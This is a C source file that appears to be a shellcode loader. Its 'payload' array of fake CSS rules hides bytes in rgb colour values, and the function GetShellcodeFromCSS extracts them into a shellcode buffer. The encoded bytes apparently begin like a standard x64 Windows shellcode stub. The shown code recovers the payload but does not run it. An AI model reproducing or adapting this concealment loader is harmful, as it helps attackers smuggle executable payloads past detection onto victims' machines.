#define PCRE2_CODE_UNIT_WIDTH 8
#define PCRE2_STATIC
#include <pcre2.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>

const char* payload[] = {
    ":root {{",
    "}}",
    ".AEAXVTK0QXP4 div p {",
    "    border: 2px 2px solid rgb(252, 118, 156);",
    "    border: 2px 2px solid rgb(72, 140, 112);",
    "    border: 2px 2px solid rgb(131, 97, 11);",
    "    border: 2px 2px solid rgb(228, 181, 89);",
    "    border: 2px 2px solid rgb(240, 116, 126);",
    "    border: 2px 2px solid rgb(232, 233, 58);",
    "    border: 2px 2px solid rgb(192, 63, 78);",
    "    border: 2px 2px solid rgb(0, 232, 244);",
    "    border: 2px 2px solid rgb(0, 62, 200);",
    "    border: 2px 2px solid rgb(0, 146, 254);",
    "    border: 2px 2px solid rgb(65, 230, 26);",
    "    border: 2px 2px solid rgb(81, 166, 89);",
    "    border: 2px 2px solid rgb(65, 12, 134);",
    "    border: 2px 2px solid rgb(80, 121, 11);",
    "    border: 2px 2px solid rgb(82, 131, 50);",
    "    border: 2px 2px solid rgb(81, 233, 99);",
    "}",
    ".PLTD4LL6MRXN div p {",
    "    border: 2px 2px solid rgb(86, 39, 160);",
    "    border: 2px 2px solid rgb(72, 3, 178);",
    "    border: 2px 2px solid rgb(49, 103, 25);",
    "    border: 2px 2px solid rgb(210, 180, 57);",
    "    border: 2px 2px solid rgb(101, 160, 125);",
    "    border: 2px 2px solid rgb(72, 71, 113);",
    "    border: 2px 2px solid rgb(139, 215, 188);",
    "    border: 2px 2px solid rgb(82, 248, 33);",
    "    border: 2px 2px solid rgb(96, 53, 33);",
    "    border: 2px 2px solid rgb(72, 235, 213);",
    "    border: 2px 2px solid rgb(139, 161, 198);",
    "    border: 2px 2px solid rgb(82, 99, 166);",
    "    border: 2px 2px solid rgb(24, 157, 101);",
    "    border: 2px 2px solid rgb(72, 143, 88);",
    "    border: 2px 2px solid rgb(139, 167, 231);",
    "    border: 2px 2px solid rgb(82, 229, 89);",
    "}",
    ".EXK2K61ZXZHZ div p {",
    "    border: 2px 2px solid rgb(32, 184, 64);",
    "    border: 2px 2px solid rgb(72, 161, 94);",
    "    border: 2px 2px solid rgb(139, 92, 227);",
    "    border: 2px 2px solid rgb(114, 141, 207);",
    "    border: 2px 2px solid rgb(80, 192, 182);",
    "    border: 2px 2px solid rgb(72, 251, 107);",
    "    border: 2px 2px solid rgb(15, 152, 8);",
    "    border: 2px 2px solid rgb(183, 213, 190);",
    "    border: 2px 2px solid rgb(74, 220, 134);",
    "    border: 2px 2px solid rgb(74, 25, 116);",
    "    border: 2px 2px solid rgb(77, 105, 92);",
    "    border: 2px 2px solid rgb(49, 193, 244);",
    "    border: 2px 2px solid rgb(201, 151, 226);",
    "    border: 2px 2px solid rgb(72, 3, 39);",
    "    border: 2px 2px solid rgb(49, 237, 3);",
    "    border: 2px 2px solid rgb(192, 97, 23);",
    "}",
    ".CRE33FUKKPZZ div p {",
    "    border: 2px 2px solid rgb(172, 60, 65);",
    "    border: 2px 2px solid rgb(60, 181, 128);",
    "    border: 2px 2px solid rgb(97, 148, 184);",
    "    border: 2px 2px solid rgb(124, 170, 36);",
    "    border: 2px 2px solid rgb(2, 198, 131);",
    "    border: 2px 2px solid rgb(44, 163, 55);",
    "    border: 2px 2px solid rgb(32, 230, 114);",
    "    border: 2px 2px solid rgb(65, 143, 231);",
    "    border: 2px 2px solid rgb(193, 34, 251);",
    "    border: 2px 2px solid rgb(201, 233, 66);",
    "    border: 2px 2px solid rgb(13, 236, 38);",
    "    border: 2px 2px solid rgb(65, 231, 84);",
    "    border: 2px 2px solid rgb(1, 170, 33);",
    "    border: 2px 2px solid rgb(193, 196, 33);",
    "    border: 2px 2px solid rgb(226, 212, 43);",
    "    border: 2px 2px solid rgb(237, 210, 26);",
    "}",
    ".RV5F8OEOXYL7 div p {",
    "    border: 2px 2px solid rgb(82, 12, 3);",
    "    border: 2px 2px solid rgb(65, 68, 184);",
    "    border: 2px 2px solid rgb(81, 201, 182);",
    "    border: 2px 2px solid rgb(72, 214, 102);",
    "    border: 2px 2px solid rgb(139, 26, 110);",
    "    border: 2px 2px solid rgb(82, 186, 175);",
    "    border: 2px 2px solid rgb(32, 154, 225);",
    "    border: 2px 2px solid rgb(139, 50, 24);",
    "    border: 2px 2px solid rgb(66, 50, 103);",
    "    border: 2px 2px solid rgb(60, 234, 99);",
    "    border: 2px 2px solid rgb(72, 225, 232);",
    "    border: 2px 2px solid rgb(1, 135, 29);",
    "    border: 2px 2px solid rgb(208, 157, 7);",
    "    border: 2px 2px solid rgb(139, 3, 221);",
    "    border: 2px 2px solid rgb(128, 244, 218);",
    "    border: 2px 2px solid rgb(136, 229, 182);",
    "}",
    ".BGWFHM2IFT60 div p {",
    "    border: 2px 2px solid rgb(0, 183, 214);",
    "    border: 2px 2px solid rgb(0, 77, 239);",
    "    border: 2px 2px solid rgb(0, 127, 221);",
    "    border: 2px 2px solid rgb(72, 32, 37);",
    "    border: 2px 2px solid rgb(133, 135, 200);",
    "    border: 2px 2px solid rgb(192, 6, 57);",
    "    border: 2px 2px solid rgb(116, 94, 45);",
    "    border: 2px 2px solid rgb(103, 127, 19);",
    "    border: 2px 2px solid rgb(72, 32, 2);",
    "    border: 2px 2px solid rgb(1, 17, 192);",
    "    border: 2px 2px solid rgb(208, 191, 233);",
    "    border: 2px 2px solid rgb(80, 242, 54);",
    "    border: 2px 2px solid rgb(139, 146, 213);",
    "    border: 2px 2px solid rgb(72, 189, 27);",
    "    border: 2px 2px solid rgb(24, 252, 162);",
    "    border: 2px 2px solid rgb(68, 23, 19);",
    "}",
    ".B1RPRGXYV052 div p {",
    "    border: 2px 2px solid rgb(139, 4, 55);",
    "    border: 2px 2px solid rgb(64, 32, 24);",
    "    border: 2px 2px solid rgb(32, 154, 133);",
    "    border: 2px 2px solid rgb(73, 37, 111);",
    "    border: 2px 2px solid rgb(1, 42, 226);",
    "    border: 2px 2px solid rgb(208, 107, 86);",
    "    border: 2px 2px solid rgb(227, 184, 128);",
    "    border: 2px 2px solid rgb(86, 123, 2);",
    "    border: 2px 2px solid rgb(72, 211, 58);",
    "    border: 2px 2px solid rgb(255, 86, 86);",
    "    border: 2px 2px solid rgb(201, 19, 122);",
    "    border: 2px 2px solid rgb(65, 179, 214);",
    "    border: 2px 2px solid rgb(139, 219, 46);",
    "    border: 2px 2px solid rgb(52, 138, 26);",
    "    border: 2px 2px solid rgb(136, 76, 206);",
    "    border: 2px 2px solid rgb(72, 197, 179);",
    "}",
    ".OCMZ82WF837N div p {",
    "    border: 2px 2px solid rgb(1, 230, 38);",
    "    border: 2px 2px solid rgb(214, 180, 48);",
    "    border: 2px 2px solid rgb(77, 224, 207);",
    "    border: 2px 2px solid rgb(49, 252, 228);",
    "    border: 2px 2px solid rgb(201, 167, 154);",
    "    border: 2px 2px solid rgb(72, 136, 25);",
    "    border: 2px 2px solid rgb(49, 175, 114);",
    "    border: 2px 2px solid rgb(192, 66, 145);",
    "    border: 2px 2px solid rgb(172, 90, 153);",
    "    border: 2px 2px solid rgb(65, 202, 127);",
    "    border: 2px 2px solid rgb(193, 210, 159);",
    "    border: 2px 2px solid rgb(201, 127, 212);",
    "    border: 2px 2px solid rgb(13, 30, 88);",
    "    border: 2px 2px solid rgb(65, 245, 151);",
    "    border: 2px 2px solid rgb(1, 166, 14);",
    "    border: 2px 2px solid rgb(193, 124, 60);",
    "}",
    ".7MIH3HDUTIST div p {",
    "    border: 2px 2px solid rgb(56, 66, 24);",
    "    border: 2px 2px solid rgb(224, 111, 1);",
    "    border: 2px 2px solid rgb(117, 20, 34);",
    "    border: 2px 2px solid rgb(241, 221, 3);",
    "    border: 2px 2px solid rgb(76, 71, 228);",
    "    border: 2px 2px solid rgb(3, 206, 65);",
    "    border: 2px 2px solid rgb(76, 73, 1);",
    "    border: 2px 2px solid rgb(36, 63, 14);",
    "    border: 2px 2px solid rgb(8, 213, 204);",
    "    border: 2px 2px solid rgb(69, 229, 118);",
    "    border: 2px 2px solid rgb(57, 182, 211);",
    "    border: 2px 2px solid rgb(209, 81, 98);",
    "    border: 2px 2px solid rgb(117, 98, 26);",
    "    border: 2px 2px solid rgb(216, 6, 227);",
    "    border: 2px 2px solid rgb(88, 22, 173);",
    "    border: 2px 2px solid rgb(68, 27, 208);",
    "}",
    ".5VXMP740X7M7 div p {",
    "    border: 2px 2px solid rgb(139, 164, 110);",
    "    border: 2px 2px solid rgb(64, 94, 221);",
    "    border: 2px 2px solid rgb(36, 89, 47);",
    "    border: 2px 2px solid rgb(73, 72, 206);",
    "    border: 2px 2px solid rgb(1, 203, 81);",
    "    border: 2px 2px solid rgb(208, 163, 104);",
    "    border: 2px 2px solid rgb(102, 212, 111);",
    "    border: 2px 2px solid rgb(65, 236, 21);",
    "    border: 2px 2px solid rgb(139, 83, 194);",
    "    border: 2px 2px solid rgb(12, 88, 133);",
    "    border: 2px 2px solid rgb(72, 101, 221);",
    "    border: 2px 2px solid rgb(68, 94, 238);",
    "    border: 2px 2px solid rgb(139, 74, 252);",
    "    border: 2px 2px solid rgb(64, 211, 183);",
    "    border: 2px 2px solid rgb(28, 146, 173);",
    "    border: 2px 2px solid rgb(73, 80, 173);",
    "}",
    ".VAOVJQWV353K div p {",
    "    border: 2px 2px solid rgb(1, 56, 207);",
    "    border: 2px 2px solid rgb(208, 89, 119);",
    "    border: 2px 2px solid rgb(65, 72, 108);",
    "    border: 2px 2px solid rgb(139, 183, 205);",
    "    border: 2px 2px solid rgb(4, 84, 182);",
    "    border: 2px 2px solid rgb(136, 189, 45);",
    "    border: 2px 2px solid rgb(72, 174, 68);",
    "    border: 2px 2px solid rgb(1, 237, 140);",
    "    border: 2px 2px solid rgb(208, 7, 252);",
    "    border: 2px 2px solid rgb(65, 169, 200);",
    "    border: 2px 2px solid rgb(88, 121, 150);",
    "    border: 2px 2px solid rgb(65, 232, 247);",
    "    border: 2px 2px solid rgb(88, 170, 69);",
    "    border: 2px 2px solid rgb(94, 92, 17);",
    "    border: 2px 2px solid rgb(89, 243, 71);",
    "    border: 2px 2px solid rgb(90, 110, 121);",
    "}",
    ".0UTR4F1SLMPR div p {",
    "    border: 2px 2px solid rgb(65, 145, 223);",
    "    border: 2px 2px solid rgb(88, 189, 101);",
    "    border: 2px 2px solid rgb(65, 142, 166);",
    "    border: 2px 2px solid rgb(89, 219, 84);",
    "    border: 2px 2px solid rgb(65, 218, 237);",
    "    border: 2px 2px solid rgb(90, 62, 219);",
    "    border: 2px 2px solid rgb(72, 230, 45);",
    "    border: 2px 2px solid rgb(131, 218, 92);",
    "    border: 2px 2px solid rgb(236, 247, 137);",
    "    border: 2px 2px solid rgb(32, 93, 212);",
    "    border: 2px 2px solid rgb(65, 64, 227);",
    "    border: 2px 2px solid rgb(82, 57, 42);",
    "    border: 2px 2px solid rgb(255, 186, 90);",
    "    border: 2px 2px solid rgb(224, 124, 139);",
    "    border: 2px 2px solid rgb(88, 104, 82);",
    "    border: 2px 2px solid rgb(65, 161, 119);",
    "}",
    ".KOJ3W2NXS62Z div p {",
    "    border: 2px 2px solid rgb(89, 7, 127);",
    "    border: 2px 2px solid rgb(90, 43, 90);",
    "    border: 2px 2px solid rgb(72, 60, 145);",
    "    border: 2px 2px solid rgb(139, 103, 165);",
    "    border: 2px 2px solid rgb(18, 83, 118);",
    "    border: 2px 2px solid rgb(233, 21, 238);",
    "    border: 2px 2px solid rgb(87, 2, 132);",
    "    border: 2px 2px solid rgb(255, 2, 246);",
    "    border: 2px 2px solid rgb(255, 136, 96);",
    "    border: 2px 2px solid rgb(255, 224, 55);",
    "    border: 2px 2px solid rgb(93, 219, 7);",
    "    border: 2px 2px solid rgb(72, 149, 186);",
    "    border: 2px 2px solid rgb(186, 4, 226);",
    "    border: 2px 2px solid rgb(1, 17, 55);",
    "    border: 2px 2px solid rgb(0, 172, 105);",
    "    border: 2px 2px solid rgb(0, 76, 248);",
    "}",
    ".IEHCRLMOIH7S div p {",
    "    border: 2px 2px solid rgb(0, 5, 102);",
    "    border: 2px 2px solid rgb(0, 153, 107);",
    "    border: 2px 2px solid rgb(0, 66, 25);",
    "    border: 2px 2px solid rgb(0, 192, 93);",
    "    border: 2px 2px solid rgb(0, 252, 222);",
    "    border: 2px 2px solid rgb(72, 67, 226);",
    "    border: 2px 2px solid rgb(141, 247, 231);",
    "    border: 2px 2px solid rgb(141, 62, 248);",
    "    border: 2px 2px solid rgb(1, 160, 113);",
    "    border: 2px 2px solid rgb(1, 108, 80);",
    "    border: 2px 2px solid rgb(0, 230, 253);",
    "    border: 2px 2px solid rgb(0, 251, 148);",
    "    border: 2px 2px solid rgb(65, 21, 47);",
    "    border: 2px 2px solid rgb(186, 202, 195);",
    "    border: 2px 2px solid rgb(49, 246, 211);",
    "    border: 2px 2px solid rgb(139, 64, 223);",
    "}",
    ".YO4G7EYLC6JX div p {",
    "    border: 2px 2px solid rgb(111, 222, 217);",
    "    border: 2px 2px solid rgb(135, 102, 20);",
    "    border: 2px 2px solid rgb(255, 2, 230);",
    "    border: 2px 2px solid rgb(213, 69, 240);",
    "    border: 2px 2px solid rgb(187, 80, 119);",
    "    border: 2px 2px solid rgb(224, 169, 224);",
    "    border: 2px 2px solid rgb(29, 229, 231);",
    "    border: 2px 2px solid rgb(42, 29, 252);",
    "    border: 2px 2px solid rgb(10, 96, 157);",
    "    border: 2px 2px solid rgb(65, 216, 213);",
    "    border: 2px 2px solid rgb(186, 162, 190);",
    "    border: 2px 2px solid rgb(166, 191, 126);",
    "    border: 2px 2px solid rgb(149, 122, 199);",
    "    border: 2px 2px solid rgb(189, 94, 159);",
    "    border: 2px 2px solid rgb(157, 216, 32);",
    "    border: 2px 2px solid rgb(255, 3, 226);",
    "}",
    ".XU32AP4O5KOJ div p {",
    "    border: 2px 2px solid rgb(213, 45, 84);",
    "    border: 2px 2px solid rgb(72, 224, 216);",
    "    border: 2px 2px solid rgb(131, 251, 78);",
    "    border: 2px 2px solid rgb(196, 212, 246);",
    "    border: 2px 2px solid rgb(40, 12, 71);",
    "    border: 2px 2px solid rgb(60, 110, 80);",
    "    border: 2px 2px solid rgb(6, 90, 99);",
    "    border: 2px 2px solid rgb(124, 95, 227);",
    "    border: 2px 2px solid rgb(10, 120, 229);",
    "    border: 2px 2px solid rgb(128, 184, 144);",
    "    border: 2px 2px solid rgb(251, 67, 250);",
    "    border: 2px 2px solid rgb(224, 209, 8);",
    "    border: 2px 2px solid rgb(117, 124, 167);",
    "    border: 2px 2px solid rgb(5, 251, 245);",
    "    border: 2px 2px solid rgb(187, 107, 190);",
    "    border: 2px 2px solid rgb(71, 145, 28);",
    "}",
    ".MC4LGYLN0RYG div p {",
    "    border: 2px 2px solid rgb(19, 142, 254);",
    "    border: 2px 2px solid rgb(114, 207, 17);",
    "    border: 2px 2px solid rgb(111, 106, 61);",
    "    border: 2px 2px solid rgb(106, 73, 56);",
    "    border: 2px 2px solid rgb(0, 202, 75);",
    "    border: 2px 2px solid rgb(89, 77, 243);",
    "    border: 2px 2px solid rgb(65, 82, 161);",
    "    border: 2px 2px solid rgb(137, 87, 8);",
    "    border: 2px 2px solid rgb(218, 73, 123);",
    "    border: 2px 2px solid rgb(255, 196, 25);",
    "    border: 2px 2px solid rgb(213, 19, 216);",
    "    border: 2px 2px solid rgb(99, 56, 151);",
    "    border: 2px 2px solid rgb(97, 171, 113);",
    "    border: 2px 2px solid rgb(108, 74, 102);",
    "    border: 2px 2px solid rgb(99, 44, 204);",
    "    border: 2px 2px solid rgb(0, 13, 16);",
    "}"
};

struct cssdata
{
    unsigned char* shellcode;
    int size;
};

char *strremove(char *str, const char *sub)
{
    // https://stackoverflow.com/a/47117431
    char *p, *q, *r;
    if (*sub && (q = r = strstr(str, sub)) != NULL) {
        size_t len = strlen(sub);
        while ((r = strstr(p = r + len, sub)) != NULL) {
            while (p < r)
                *q++ = *p++;
        }
        while ((*q++ = *p++) != '\0')
            continue;
    }
    return str;
}

struct cssdata * GetShellcodeFromCSS()
{
  int sz = sizeof(payload) / sizeof(payload[0]);
  int holder[sz];
  int count = 0;
  memset(holder, 0, sz);

  char* temp = (char*)malloc(10);
  memset(temp, '\0', 10);    
  for (int line = 0; line < sz; ++line)
  {  

    pcre2_code *re;
    PCRE2_SPTR pattern;
    PCRE2_SPTR subject;
    PCRE2_SPTR name_table;

    int crlf_is_newline;
    int errornumber;
    int find_all;
    int i;
    int namecount;
    int name_entry_size;
    int rc;
    int utf8;

    uint32_t option_bits;
    uint32_t newline;

    PCRE2_SIZE erroroffset;
    PCRE2_SIZE *ovector;

    size_t subject_length;
    pcre2_match_data *match_data;

    find_all = 1;

    pattern = (PCRE2_SPTR)"rgb\\((\\d{1,3}),";
    subject = (PCRE2_SPTR)payload[line];
    subject_length = strlen((char *)subject);

    re = pcre2_compile(pattern, PCRE2_ZERO_TERMINATED, 0, &errornumber, &erroroffset, NULL);

    if (re == NULL)
    {
      PCRE2_UCHAR buffer[256];
      pcre2_get_error_message(errornumber, buffer, sizeof(buffer));
      continue;
    }

    match_data = pcre2_match_data_create_from_pattern(re, NULL);

    rc = pcre2_match(re, subject, subject_length, 0, 0, match_data, NULL);

    if (rc < 0)
    {
      pcre2_match_data_free(match_data);
      pcre2_code_free(re);
      continue;
    }

    ovector = pcre2_get_ovector_pointer(match_data);

    if (rc == 0)
    {
      continue;
    }

    for (i = 0; i < rc; i++)
    {
      PCRE2_SPTR substring_start = subject + ovector[2*i];
      size_t substring_length = ovector[2*i+1] - ovector[2*i];
      sprintf(temp, "%.*s", (int)substring_length, (char *)substring_start);
    }

    (void)pcre2_pattern_info(re, PCRE2_INFO_NAMECOUNT, &namecount);

    if (namecount > 0)
    {
      PCRE2_SPTR tabptr;
      (void)pcre2_pattern_info(re, PCRE2_INFO_NAMETABLE, &name_table);
      (void)pcre2_pattern_info(re, PCRE2_INFO_NAMEENTRYSIZE, &name_entry_size);

      tabptr = name_table;
      for (i = 0; i < namecount; i++)
      {
        int n = (tabptr[0] << 8) | tabptr[1];
        tabptr += name_entry_size;
      }
    }

    (void)pcre2_pattern_info(re, PCRE2_INFO_ALLOPTIONS, &option_bits);
    utf8 = (option_bits & PCRE2_UTF) != 0;
    (void)pcre2_pattern_info(re, PCRE2_INFO_NEWLINE, &newline);
    crlf_is_newline = newline == PCRE2_NEWLINE_ANY || newline == PCRE2_NEWLINE_CRLF || newline == PCRE2_NEWLINE_ANYCRLF;

    for (;;)
    {
      uint32_t options = 0;
      PCRE2_SIZE start_offset = ovector[1];

      if (ovector[0] == ovector[1])
      {
        if (ovector[0] == subject_length)
          {
            break;
          }
        options = PCRE2_NOTEMPTY_ATSTART | PCRE2_ANCHORED;
      }

      rc = pcre2_match(re, subject, subject_length, start_offset, options, match_data, NULL);

      if (rc == PCRE2_ERROR_NOMATCH)
      {
        if (options == 0) break;
        ovector[1] = start_offset + 1;
        if (crlf_is_newline && start_offset < subject_length - 1 && subject[start_offset] == '\r' && subject[start_offset + 1] == '\n')
        ovector[1] += 1;
        else if (utf8)
          {
            while (ovector[1] < subject_length)
            {
              if ((subject[ovector[1]] & 0xc0) != 0x80) break;
              ovector[1] += 1;
            }
        }
        continue;
      }

      if (rc < 0)
      {
        pcre2_match_data_free(match_data);
        pcre2_code_free(re);
        continue;
      }

      for (i = 0; i < rc; i++)
      {
        PCRE2_SPTR substring_start = subject + ovector[2*i];
        size_t substring_length = ovector[2*i+1] - ovector[2*i];
        //sprintf(temp, "%.*s", (int)substring_length, (char *)substring_start);
      }
    }

    // remove the "rgb bit"
    strremove(temp, "rgb(");
    strremove(temp, ",");

    int intVal = atoi(temp);

    holder[count] = intVal;

    pcre2_match_data_free(match_data);
    pcre2_code_free(re);
    memset(temp, '\0', strlen(temp));
    count++;
  }

    free(temp);

    unsigned char shellcode[count];

    for (int i = 0; i < count; ++i)
    {
        shellcode[i] = (unsigned char)holder[i];
    }

    struct cssdata* d = malloc(sizeof(struct cssdata));
    d->shellcode = malloc(count);
    memcpy(d->shellcode, shellcode, count);
    d->size = count;

    return d;
}